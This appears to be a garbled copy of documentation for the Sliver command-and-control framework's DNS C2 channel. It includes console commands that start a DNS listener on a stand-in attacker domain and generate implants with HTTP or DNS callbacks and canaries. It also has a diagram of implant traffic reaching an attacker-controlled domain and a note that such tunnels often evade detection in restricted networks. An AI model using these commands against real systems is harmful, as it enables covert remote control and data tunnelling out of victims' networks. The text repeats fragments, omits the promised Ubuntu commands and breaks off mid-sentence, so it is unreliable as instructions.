# Setup
### DNS Listeners
Make sure you have a DNS listener running, and to use the FQDN again. Sliver will not be able to correctly parse C2 traffic if the parent domain is misconfigured:
```
sliver > dns --domains 1.example.com.

[*] Starting DNS listener with parent domain(s) [1.example.com.] ...
[*] Successfully started job #1
```

### DNS Canaries
Example `generate` command with canaries, make sure to use the FQDN:
```
sliver > generate --http foobar.com --canary 1.example.com.
```

### Ubuntu
**NOTE:** On recent versions of Ubuntu, you may need to disable `systemd-resolved` as this binds to your local UDP:53 and messes up everything about how DNS is supposed to work. To use a sane DNS configuration run the following commands as root because `resolved` probably broke `sudo` too:
```
[implant] <--> [resolver]
                  |<------> [.]
                  |<------> [.com.]
                  |<------> [example.com.] (attacker controlled)
```

`generate --dns 1.example.com.`

`
sliver > dns --domains 1.example.com.

[*] Starting DNS listener with parent domain(s) [1.example.com.] ...
[*] Successfully started job #1
`

`
sliver > generate --http foobar.com --canary 1.example.com.
`

` command.

### Ubuntu

**NOTE:** On recent versions of Ubuntu, you may need to disable `

`

# Under the Hood

**NOTE:** This describes the v1.5+ implementation of DNS C2. Also, I'm not going to cover the cryptographic key exchange, which you can read about [here](/docs?name=Transport+Encryption), this is just about how do we move bytes back and forth.

### Design Goals

The current implementation of DNS C2 is primarily designed for "speed" (as far as DNS tunnels go) NOT stealth; it does not intend to be subtle in its use of DNS to tunnel data. While DNS can be a very useful protocol for stealthy signaling, Sliver here is creating a full duplex tunnels, doing so covertly would generally be far too slow to be practical. The general rule of thumb is that DNS C2 is easy to detect _if you look_. That's not to say DNS C2 isn't useful or will be immediately detected as is often no one looks. As DNS does not require direct "line of sight" networking, it is often useful for tunneling out of highly restricted networks, and if the environment has not been instrumented to specifically detect DNS C2 it will likely go undetected.

For example glossing over some details, if a DNS client attempts to `

`
[implant] <--> [resolver]
                  |<------> [.]
                  |<------> [.com.]
                  |<------> [example.com.] (attacker controlled)
`

